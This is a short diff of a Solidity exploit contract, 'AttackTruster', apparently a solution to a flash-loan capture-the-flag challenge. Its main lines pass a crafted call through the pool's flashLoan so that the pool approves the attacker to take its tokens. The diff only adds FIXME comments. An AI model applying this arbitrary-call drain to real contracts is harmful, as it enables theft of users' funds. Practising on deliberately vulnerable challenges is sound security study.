@@ -24,13 +24,13 @@ contract AttackTruster {
         console.logBytes(msg.data);
         console.log(token);
         console.log(amount);
-        IERC20(token).approve(owner, amount);
+        IERC20(token).approve(owner, amount); // FIXME:
     }
     
     function executeFlashLoan(address token, uint256 amount) external {
         require(msg.sender == owner, "Only owner can execute flash loan");
         // bytes memory data = abi.encodeWithSignature('IERC20(token).approve(address,uint256)', owner, amount);
-        bytes memory data = abi.encodeWithSignature('exploit(address,uint256)', token, amount);
-        pool.flashLoan(0, owner, address(this), data);
+        bytes memory data = abi.encodeWithSignature('exploit(address,uint256)', token, amount); // FIXME:
+        pool.flashLoan(0, owner, address(this), data); // FIXME:
     }
 }
